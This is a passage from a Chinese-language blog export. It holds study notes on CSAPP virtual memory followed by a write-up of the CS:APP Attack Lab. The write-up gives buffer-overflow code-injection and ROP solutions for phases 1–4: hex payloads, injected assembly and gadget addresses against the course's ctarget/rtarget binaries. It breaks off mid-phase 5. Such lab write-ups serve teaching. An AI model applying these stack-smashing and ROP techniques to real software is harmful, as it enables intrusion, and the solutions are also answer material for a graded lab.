src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210618145533203.png" alt="image-20210618145533203"></p><p><strong>TLB命中时的步骤：</strong></p><ul><li>第一步：CPU产生一个虚拟地址。</li><li>第二步和第三步：MMU从TLB中取出相应的PTE.</li><li>第四步：MMU将这个虚拟地址翻译成一个物理地址，并且将它发送到高速缓存/主存。</li><li>第五步：高速缓存/主存将所请求的数据字返回给CPU.</li></ul><p>当TLB不命中时，MMU必须从L1缓存中取出相应的PTE,如图9-16b所示。新取出的PTE存放在TLB中，可能会覆盖一个已经存在的条目。</p><h4 id="9-6-3-多级页表"><a href="#9-6-3-多级页表" class="headerlink" title="9.6.3 多级页表"></a>9.6.3 多级页表</h4><p><strong>一级页表</strong>中的每个PTE负责映射虚拟地址空间中一个4MB的片( chunk),这里每一片都是由1024个连续的页面组成的。比如，PTE0映射第一片，PTE1映射接下来的一片，以此类推。假设地址空间是4GB,1024个PTE已经足够覆盖整个空间了。</p><p><strong>二级页表</strong>中的每个PTE都负责映射一个4KB的虚拟存储器页面，就像我们査看只有一级的页表一样。注意，使用4字节的PTE,每个一级和二级页表都是4KB字节，这刚好和一个页面<br>的大小是一样的。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210618152422961.png" alt="image-20210618152422961"></p><p>这种方法从<strong>两个方面减少了存储器要求：</strong></p><ul><li>第一，如果一级页表中的一个PTE是空的，那么相应的二级页表就根本不会存在，这代表着一种巨大的潜在节约，因为对于一个典型的程序，4GB的虚拟地址空间的大部分都将是未分配的。</li><li>第二，只有一级页表才需要总是在主存中；虚拟存储器系统可以在需要时创建、页面调入或调出二级页表，这就减少了主存的压力；只有最经常使用的二级页表才需要缓存在主存中</li></ul><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210618152610119.png" alt="image-20210618152610119"></p><h4 id="9-6-4-综合：端到端的地址翻译"><a href="#9-6-4-综合：端到端的地址翻译" class="headerlink" title="9.6.4 综合：端到端的地址翻译"></a>9.6.4 综合：端到端的地址翻译</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210619114131611.png" alt="image-20210619114131611"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210619114151547.png" alt="image-20210619114151547"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210619114205017.png" alt="image-20210619114205017"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210619114233781.png" alt="image-20210619114233781"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210619114250559.png" alt="image-20210619114250559"></p><hr><h3 id="9-7-案例研究：-Intel-Core-i7-Linux存储器系统"><a href="#9-7-案例研究：-Intel-Core-i7-Linux存储器系统" class="headerlink" title="9.7 案例研究： Intel Core i7/ Linux存储器系统"></a>9.7 案例研究： Intel Core i7/ Linux存储器系统</h3><hr><h3 id="9-8-存储器映射"><a href="#9-8-存储器映射" class="headerlink" title="9.8 存储器映射"></a>9.8 存储器映射</h3><h4 id="9-8-1-再看共亨对象"><a href="#9-8-1-再看共亨对象" class="headerlink" title="9.8.1 再看共亨对象"></a>9.8.1 再看共亨对象</h4><p>一个对象可以被映射到虚拟存储器的一个区域，要么作为<strong>共享对象</strong>，要么作为<strong>私有对象</strong>。</p><p>如果一个进程将一个<strong>共享对象</strong>映射到它的虚拟地址空间的一个区域内，那么这个进程对这个区域的任何写操作，对于那些也把这个共享对象映射到它们虚拟存储器的其他进程而言也是可见的。而且，这些变化也会反映在磁盘上的原始对象中。<br>另一方面，对一个映射到<strong>私有对象</strong>的区域做的改变，对于其他进程来说是不可见的，并且进程对这个区域所做的任何写操作都不会反映在磁盘上的对象中。一个映射到共享对象的虚拟存储器区域叫做共享区域。类似地，也有私有区域。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210621163041564.png" alt="image-20210621163041564"></p><p><strong>写时拷贝</strong></p><p>私有对象是使用一种叫做<strong>写时拷贝</strong>(copy-on- write)的巧妙技术被映射到虚拟存储器中的。<br>一个私有对象开始生命周期的方式基本上与共享对象的一样，在物理存储器中只保存有私有对象的一份拷贝。比如，图9-30a展示了一种情况，其中两个进程将一个私有对象映射到它们虚拟存储器的不同区城，但是共享这个对象同一个物理拷贝。对于每个映射私有对象的进程，相应私有区域的页表条目都被标记为<strong>只读</strong>，并且区域结构被标记为私有的写时拷贝。只要没有进程试图写它自己的私有区域，它们就可以继续共享物理存储器中对象的一个单独拷贝。然而，只要有一个进程试图写私有区城内的某个页面，那么这个写操作就会触发一个保护故障。<br>当故障处理程序注意到保护异常是由于进程试图写私有的写时拷贝区城中的一个页面而引起的，它就会在物理存储器中<strong>创建这个页面的一个新拷贝</strong>，<strong>更新页表条目</strong>指向这个新的拷贝，然后<strong>恢复</strong>这个页面的<strong>可写权限</strong>，如图9-30b所示。当故障处理程序返回时，CPU重新执行这个写操作，现在在新创建的页面上这个写操作就可以正常执行了。<br>通过延迟私有对象中的拷贝直到最后可能的时刻，写时拷贝最充分地使用了稀有的物理存储器。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210621163448754.png" alt="image-20210621163448754"></p><h4 id="9-8-2-再看fork函数"><a href="#9-8-2-再看fork函数" class="headerlink" title="9.8.2 再看fork函数"></a>9.8.2 再看fork函数</h4><p>新创建的子进程几乎但不完全与父进程相同。<strong>子进程得到与父进程用户级虚拟地址空间相同</strong><br><strong>的（但是独立的）一份拷贝，包括文本、数据和bss段、堆以及用户栈。子进程还获得与父进程</strong><br><strong>任何打开文件描述符相同的拷贝，这就意味着当父进程调用fork时，子进程可以读写父进程中</strong><br><strong>打开的任何文件。父进程和新创建的子进程之间最大的区别在于它们有不同的PID。</strong></p><p>既然我们理解了虚拟存储器和存储器映射，那么我们可以清晰地知道fork函数是如何创建一个带有自己独立虚拟地址空间的新进程的。<br><strong>当fork函数被当前进程调用时，内核为新进程创建各种数据结构，并分配给它一个唯一的PID.为了给这个新进程创建虚拟存储器，它创建了当前进程的 mm_struct、区域结构和页表的原样拷贝。它将两个进程中的每个页面都标记为只读，并将两个进程中的每个区域结构都标记为私有的写时拷贝。</strong></p><p>当fork在新进程中返回时，新进程现在的虚拟存储器刚好和调用fork时存在的虚拟存储器相同。当这两个进程中的任一个后来进行写操作时，写时拷贝机制就会创建新页面，因此，也就为每个进程保持了私有地址空间的抽象概念。</p><h4 id="9-8-3-再看-execvel函数"><a href="#9-8-3-再看-execvel函数" class="headerlink" title="9.8.3 再看 execvel函数"></a>9.8.3 再看 execvel函数</h4><p>正如在第8章中学到的， execve函数在当前进程中加载并运行包含在可执行目标文件a.out中的程序，用a.out程序有效地替代了当前程序。加载并运行a.out需要以下几个步骤：</p><ul><li><strong>删除已存在的用户区域</strong>。删除当前进程虚拟地址的用户部分中的已存在的区域结构。</li><li><strong>映射私有区域</strong>。为新程序的文本、数据、bss和栈区域创建新的区域结构。所有这些新的区域都是私有的、写时拷贝的。文本和数据区域被映射为a.out文件中的文本和数据区。bbs区域是请求二进制零的，映射到匿名文件，其大小包含在a.out中。栈和堆区域也是请求二进制零的，初始长度为零。图9-31概括了私有区域的不同映射。</li><li><strong>映射共享区域</strong>。如果a.out程序与共享对象（或目标）链接，比如标准C库libc.so,那么这些对象都是动态链接到这个程序的，然后再映射到用户虚拟地址空间中的共享区域内。</li><li>**设置程序计数器(PC)**。 execve的最后一件事情就是设置当前进程上下文中的程序计数器，使之指向文本区域的入口点。</li></ul><p>下一次调度这个进程时，它将从这个入口点开始执行。Linux将根据需要换入代码和数据页面。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210621164152972.png" alt="image-20210621164152972"></p><h4 id="9-8-4-使用mmap函数的用户级存储器映射"><a href="#9-8-4-使用mmap函数的用户级存储器映射" class="headerlink" title="9.8.4 使用mmap函数的用户级存储器映射"></a>9.8.4 使用mmap函数的用户级存储器映射</h4><hr><h3 id="9-9-动态存储器分配"><a href="#9-9-动态存储器分配" class="headerlink" title="9.9 动态存储器分配"></a>9.9 动态存储器分配</h3><hr><h3 id="9-10-垃圾收集"><a href="#9-10-垃圾收集" class="headerlink" title="9.10 垃圾收集"></a>9.10 垃圾收集</h3><hr><h3 id="9-11-C程序中常见的与存储器有关的"><a href="#9-11-C程序中常见的与存储器有关的" class="headerlink" title="9.11 C程序中常见的与存储器有关的"></a>9.11 C程序中常见的与存储器有关的</h3>]]></content>
    
    
    <categories>
      
      <category>计算机系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>lab4_attack lab</title>
    <link href="/2021/07/04/Attack_lab/"/>
    <url>/2021/07/04/Attack_lab/</url>
    
    <content type="html"><![CDATA[<h1 id="Attack-lab"><a href="#Attack-lab" class="headerlink" title="Attack lab"></a>Attack lab</h1><h2 id="实验概括"><a href="#实验概括" class="headerlink" title="实验概括"></a>实验概括</h2><p>要求你进行五次攻击。攻击方式是code injection代码注入和Reeturn-oriented programming(ROP)</p><p>文件列表：<br>|文件|用途|<br>| —- | —- |<br>|ctarget|用来做Code injection攻击的程序，phase1-3|<br>|rtarget|用来做ROP攻击的程序,phase 4-5|<br>|cookie.txt|作为攻击的标识符|<br>|hex2raw|用来生成工具字符串|<br>|farm.c|用于生成面向返回的编程攻击|</p><h2 id="预备知识——缓冲区溢出"><a href="#预备知识——缓冲区溢出" class="headerlink" title="预备知识——缓冲区溢出"></a>预备知识——缓冲区溢出</h2><p>缓冲区溢出的基本原理并不复杂。缓冲区就是操作系统为函数执行专门划分出的一段内存，包括栈(自动变量)、堆(动态内存)和静态数据区(全局或静态)。其中缓冲区溢出发生在栈里，栈存放了函数的参数、返回地址、EBP（EBP是当前函数的存取指针，即存储或者读取数时的指针基地址，可以看成一个标准的函数起始代码）和局部变量。</p><p><strong>当函数中对局部变量的赋值超过了为其分配的存储空间，超出的部分就会覆盖栈里其他部分的数据，也就是发生了缓冲区溢出</strong>。</p><p><img src="/2021/07/04/Attack_lab/14ce36d3d539b6000b87d3d293d6f22cc75cb793-1625283594106.jpeg" alt="img"></p><p><img src="/2021/07/04/Attack_lab/9213b07eca806538756b3e9fee5b6642af3482c2.jpeg" alt="img"></p><h2 id="预备知识——ROP攻击"><a href="#预备知识——ROP攻击" class="headerlink" title="预备知识——ROP攻击"></a>预备知识——ROP攻击</h2><h3 id="ROP攻击"><a href="#ROP攻击" class="headerlink" title="ROP攻击"></a>ROP攻击</h3><p>缓冲区溢出攻击的普遍发生给计算机系统造成了许多麻烦。现代的编译器和操作系统实现了许多机制，以避免遭受这样的攻击，限制入侵者通过缓冲区溢出攻击获得系统控制的方式。</p><p>（1）<strong>栈随机化</strong></p><p><code>栈随机化</code>的思想使得栈的位置在程序每次运行时都有变化。因此，即使许多机器都运行同样的代码，它们的栈地址都是不同的。上述3个阶段中，栈的地址是固定的，所以我们可以获取到栈的地址，并跳转到栈的指定位置。</p><p>（2）<strong>栈破坏检测</strong></p><p>最近的GCC版本在产生的代码加入了一种<code>栈保护者</code>机制，来检测缓冲区越界。其思想是在栈帧中任何局部缓冲区和栈状态之间存储一个特殊的金丝雀值。在恢复寄存器状态和从函数返回之前，程序检查这个金丝雀值是否被该函数的某个操作或者该函数调用的某个操作改变了。如果是的，那么程序异常中止。</p><p>（3）<strong>限制可执行代码区域</strong></p><p>最后一招是消除攻击者向系统中插入可执行代码的能力。一种方法是限制哪些内存区域能够存放可执行代码。</p><p>在ROP攻击中，因为栈上限制了不可插入可执行代码，所以不能像上述第二、第三阶段中插入代码。所以我们需要在已经存在的程序中找到特定的指令序列，并且这些指令是以<code>ret</code>结尾，这一段指令序列，我们称之为<code>gadget</code>。</p><p>每一段<code>gadget</code>包含一系列指令字节，而且以<code>ret</code>结尾，跳转到下一个<code>gadget</code>，就这样连续的执行一系列的指令代码，对程序造成攻击。</p><p><strong>示例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setval_210</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> *p)</span></span><br><span class="hljs-function"></span>&#123;<br>  *p = <span class="hljs-number">3347663060U</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于上述代码，进行反汇编我们可以得到如下的执行序列，从中我们一个得到一个有趣指令序列:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">0000000000400f15 &lt;setval_210&gt;:<br>  400f15: c7 07 d4 48 89 c7 movl <span class="hljs-variable">$0xc78948d4</span>,(%rdi)<br>  400f1b: c3 retq<br></code></pre></td></tr></table></figure><p>其中，字节序列<code>48 89 c7</code>是对指令<code>movq %rax, %rdi</code>的编码，就这样我们可以利用已经存在的程序，从中提取出特定的指令,执行特定的功能，地址为<code>0x400f18</code>，其功能是将<code>%rax</code>的内容移到<code>%rdi</code>。</p><p>指令的编码如下所示：</p><p><img src="/2021/07/04/Attack_lab/1433829-d6312f1ce53cf044.png" alt="img"></p><p>movq指令编码</p><p><img src="/2021/07/04/Attack_lab/1433829-2a663eb32fae331a.png" alt="img"></p><p>popq指令编码</p><p><img src="/2021/07/04/Attack_lab/1433829-c713c395456655fa.png" alt="img"></p><p>movl指令编码</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/1433829-67690582e19e902b.png" alt="img"></p><h2 id="实验开始"><a href="#实验开始" class="headerlink" title="实验开始"></a>实验开始</h2><h3 id="1-phase1"><a href="#1-phase1" class="headerlink" title="1) phase1"></a>1) phase1</h3><ul><li><p><strong>任务目标</strong></p><p>让getbuf()函数返回touch1()</p></li><li><p><strong>实验步骤</strong></p><p>首先对ctarget进行gdb调试</p><p>然后对getbuf 进行反汇编    </p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210330205208407.png" alt="image-20210330205208407"></p><p>对touch1进行反汇编</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210330205255616.png" alt="image-20210330205255616"></p><p>可知getbuf()开辟了0x28，即40字节的空间，返回地址存在%rsp+0x28的地址，</p><p>而touch1的初始地址为0x004017c0</p><p>所以当我们存入缓冲区的数据，即touch1的初始地址可以覆盖这个返回地址时，我们就可以成功返回touch1了</p><p>攻击序列设置：</p><p>00 00 00 00 00 00 00 00 00 00</p><p>00 00 00 00 00 00 00 00 00 00</p><p>00 00 00 00 00 00 00 00 00 00</p><p>00 00 00 00 00 00 00 00 00 00</p><p>c0 17 40 00 00 00 00 00</p><p>以小端方式存储于1.txt中</p><p>用hex2raw转化为字符串，执行命令</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">./hex2raw <span class="hljs-attribute">&lt;1.txt &gt;</span>2.txt<br></code></pre></td></tr></table></figure><p>再执行</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./ctarget</span> -qi 2.txt<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210330210214612.png" alt="image-20210330210214612"></p></li></ul><h3 id="2-phase2"><a href="#2-phase2" class="headerlink" title="2) phase2"></a>2) phase2</h3><ul><li><p><strong>任务要求</strong></p><p>要求程序执行完getbuf()后，执行touch2，而且还要传入参数，即你的cookie</p></li><li><p><strong>实验步骤</strong></p><p>反汇编查看touch2地址</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210330211924002.png" alt="image-20210330211924002"></p><p>要求我们把参数设置为cookie，即把%rdi的值改为cookie，再执行touch2. 即ret touch2的地址。</p><p>转化为汇编代码保存在1.s中，</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">movq</span> $<span class="hljs-number">0</span>x<span class="hljs-number">59</span>b<span class="hljs-number">997</span>fa,%rdi<br><span class="hljs-attribute">pushq</span>  $<span class="hljs-number">0</span>x<span class="hljs-number">4017</span>ec<br><span class="hljs-attribute">ret</span><br></code></pre></td></tr></table></figure><p>用<code>gcc -c 1.s -o 1.o</code>指令转化为机器代码</p><p>并将其反汇编，保存在2.txt中，2.txt如图</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210331210915437.png" alt="image-20210331210915437"></p><p>利用gdb调试，进入getbuf函数里，查看%rsp的地址</p><p><img src="/2021/07/04/Attack_lab/image-20210412193826843.png" alt="image-20210412193826843"></p><p>如上所示，我们获取到了%rsp的地址，结合上文所讲，可以构造出如下字符串，在栈的开始位置为注入代码的指令序列，然后填充满至40个字节，在接下来的8个字节，也就是原来的返回地址，填充成注入代码的起始地址，也就是%rsp的地址，可以得到如下字符串，保存在1.txt中</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210331211305114.png" alt="image-20210331211305114"></p><p><img src="/2021/07/04/Attack_lab/1433829-fa485a0533812b76.png" alt="img"></p><p>利用raw2hex转化为字符串</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">./hex2raw <span class="hljs-attribute">&lt;1.txt&gt;</span> 2.txt<br></code></pre></td></tr></table></figure><p>再执行</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./ctarget</span> -qi 2.txt<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210331211454524.png" alt="image-20210331211454524"></p></li></ul><h3 id="3-phase3"><a href="#3-phase3" class="headerlink" title="3) phase3"></a>3) phase3</h3><ul><li><p><strong>任务要求</strong></p><p>第三阶段，也是需要在输入的字符串中注入一段代码，但是不同于第二阶段的是，在这一阶段中我们需要将cookie转化为字符串作为参数。</p><p><img src="/2021/07/04/Attack_lab/image-20210412202523955.png" alt="image-20210412202523955"></p></li><li><p><strong>实验步骤</strong></p><p>我们首先构造注入代码，touch3的地址为0x4018fa,根据上一关我们已经得到的%rsp地址0x5561dc78，返回地址应为%rsp+0x28（保存代码执行地址的位置）,然后字符串地址应为%rsp+0x30(48)，即0x5561dca0.</p><p>所以注入代码为,保存在cs.s中</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">movq</span> $<span class="hljs-number">0</span>x<span class="hljs-number">5561</span>dc<span class="hljs-number">98</span>,%rdi                                                                                     <br><span class="hljs-attribute">pushq</span> $<span class="hljs-number">0</span>x<span class="hljs-number">004018</span>fa<br><span class="hljs-attribute">retq</span><br></code></pre></td></tr></table></figure><p>汇编和反汇编</p><p><img src="/2021/07/04/Attack_lab/image-20210412203205921.png" alt="image-20210412203205921"></p><p><img src="/2021/07/04/Attack_lab/image-20210412203220388.png" alt="image-20210412203220388"></p><p>利用man ascii将cookie转化为16进制</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">35 </span><span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>所以，注入序列为：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">48 </span>c7 c7 a8 dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">68</span> fa <span class="hljs-number">18</span> <br><span class="hljs-symbol">40 </span><span class="hljs-number">00</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">00 </span><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">78 </span>dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">35</span> <span class="hljs-number">39</span><br><span class="hljs-symbol">62 </span><span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>将其保存在touch_3.txt中，执行指令，可得：</p><p><img src="/2021/07/04/Attack_lab/image-20210412203956357.png" alt="image-20210412203956357"></p></li></ul><h3 id="4-phase4"><a href="#4-phase4" class="headerlink" title="4) phase4"></a>4) phase4</h3><ul><li><p><strong>任务要求</strong></p><p>在这一阶段中，我们其实是重复代码注入攻击中第二阶段的任务，劫持程序流，返回到<code>touch2</code>函数。只不过这个我们要做的是ROP攻击，这一阶段我们无法再像上一阶段中将指令序列放入到栈中，所以我们需要到现有的程序中，找到我们需要的指令序列。</p></li><li><p><strong>实验步骤</strong></p><p>我们需要的代码序列：</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cos">popq <span class="hljs-built_in">%rax</span><br>movq <span class="hljs-built_in">%rax</span>, <span class="hljs-built_in">%rdi</span><br></code></pre></td></tr></table></figure><p>其指令编码为：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">58</span><br><span class="hljs-symbol">48 </span><span class="hljs-number">89</span> c7<br></code></pre></td></tr></table></figure><p>在rtarget的反汇编代码中查找</p><p><img src="/2021/07/04/Attack_lab/image-20210412211719953.png" alt="image-20210412211719953"></p><p>所以popq %rax指令起始地址为：0x4019ab</p><p><img src="/2021/07/04/Attack_lab/image-20210412211839599.png" alt="image-20210412211839599"></p><p>所以movq %rax, %rdi指令起始地址为：0x4019a2</p><p>所以得到字符串，保存在touch_4中：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">ab</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">fa</span> <span class="hljs-number">97</span> b<span class="hljs-number">9</span> <span class="hljs-number">59</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">ec</span> <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>执行指令：</p><p><img src="/2021/07/04/Attack_lab/image-20210412212407837.png" alt="image-20210412212407837"></p></li></ul><h3 id="5-phase5"><a href="#5-phase5" class="headerlink" title="5) phase5"></a>5) phase5</h3><ul><li><p><strong>任务要求</strong></p><p>在这一阶段中，我们需要做的就是把字符串的起始地址，传送到<code>%rdi</code>,然后调用<code>touch3</code>函数。</p><p>因为每次栈的位置是随机的，所以无法直接用地址来索引字符串的起始地址，只能用栈顶地址 + 偏移量来索引字符串的起始地址。从<code>farm</code>中我们可以获取到这样一个<code>gadget</code>，<code>lea (%rdi,%rsi,1),%rax</code>，这样就可以把字符串的首地址传送到<code>%rax</code>。</p></li><li><p><strong>实验步骤</strong></p><p>解题思路：</p><p>（1）首先获取到<code>%rsp</code>的地址，并且传送到<code>%rdi</code><br> （2）其二获取到字符串的偏移量值，并且传送到<code>%rsi</code><br> （3）<code>lea (%rdi,%rsi,1),%rax</code>, 将字符串的首地址传送到<code>%rax</code>, 再传送到<code>%rdi</code><br> （4）调用<code>touch3</code>函数</p></li></ul><p>(1) 第一步，获取到<code>%rsp</code>的地址</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">0000000000401a03 <span class="hljs-tag">&lt;<span class="hljs-name">addval_190</span>&gt;</span>:<br>  401a03: 8d 87 41 48 89 e0     lea    -0x1f76b7bf(%rdi),%eax<br>  401a09: c3  <br><br></code></pre></td></tr></table></figure><p>movq %rsp, %rax<code>的指令字节为：</code>48 89 e0<code>, 所以这一步的</code>gadget<code>地址为：</code>0x401a06</p><p>(2) 第二步，将<code>%rax</code>的内容传送到<code>%rdi</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">00000000004019a0 <span class="hljs-tag">&lt;<span class="hljs-name">addval_273</span>&gt;</span>:<br>  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax<br>  4019a6: c3<br><br></code></pre></td></tr></table></figure><p>movq %rax, %rdi<code>的指令字节为：</code>48 89 c7<code>，所以这一步的</code>gadget<code>地址为：</code>0x4019a2</p><p>(3) 第三步，将偏移量的内容弹出到<code>%rax</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">00000000004019ca &lt;getval_280&gt;:<br>  4019ca: b8 29 58 90 c3        mov    <span class="hljs-variable">$0xc3905829</span>,%eax<br>  4019cf: c3   <br><br></code></pre></td></tr></table></figure><p>popq %rax<code>的指令字节为：</code>58<code>， 其中</code>90<code>为</code>nop<code>指令, 所以这一步的</code>gadget<code>地址为：</code>0x4019cc</p><p>(4) 第四步，将<code>%eax</code>的内容传送到<code>%edx</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">00000000004019db &lt;getval_481&gt;:<br>  4019db: b8 5c 89 c2 90        mov    <span class="hljs-variable">$0x90c2895c</span>,%eax<br>  4019e0: c3    <br><br></code></pre></td></tr></table></figure><p>movl %eax, 